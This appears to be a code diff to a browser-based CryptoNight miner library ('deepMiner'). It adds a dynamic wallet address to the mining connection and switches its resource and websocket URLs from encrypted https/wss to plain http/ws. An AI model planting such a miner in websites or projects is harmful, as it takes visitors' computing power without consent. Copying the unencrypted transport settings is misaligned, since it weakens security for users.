@@ -3,6 +3,9 @@
     var Miner = function (siteKey, params) {
         this.params = params || {};
         this._siteKey = siteKey;
+        //added rnel for dynamic url 01-30-2018
+        this._wallet = '';
+        //end rnel
         this._user = null;
         this._threads = [];
         this._hashes = 0;
@@ -364,6 +367,9 @@
         this._emit("open");
         var params = {
             site_key: this._siteKey,
+            //added rnel for dynimc wallet address 01-30-2018
+            wallet: this._wallet,
+            //end rnel
             type: "anonymous",
             user: null,
             goal: 0
@@ -574,9 +580,9 @@
 })(window);
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
-    LIB_URL: "https://%deepMiner_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%deepMiner_domain%/api"]],
+    LIB_URL: "http://%deepMiner_domain%/lib/",
+    WEBSOCKET_SHARDS: [["ws://%deepMiner_domain%/proxy"]],
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
-deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://%deepMiner_domain%/worker.min.js";
+deepMiner.CRYPTONIGHT_WORKER_BLOB = "http://%deepMiner_domain%/worker.js";
